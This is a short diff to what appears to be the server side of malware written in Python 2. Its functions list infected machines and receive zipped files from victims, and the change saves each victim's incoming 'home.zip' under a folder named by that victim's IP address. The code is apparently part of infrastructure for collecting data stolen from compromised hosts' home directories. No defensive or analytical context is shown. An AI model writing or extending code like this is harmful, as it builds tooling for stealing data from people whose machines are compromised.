@@ -69,7 +69,8 @@ def list_infected():
 
 def process_zip_file(victim_ip, file_contents):
     print "Got the file from %s" % victim_ip
-    with open("Python_received.zip", "w") as f:
+    zip_name = str(victim_ip) + "/home.zip"
+    with open(zip_name, "w") as f:
         f.write(str(file_contents[2:]))
 
 
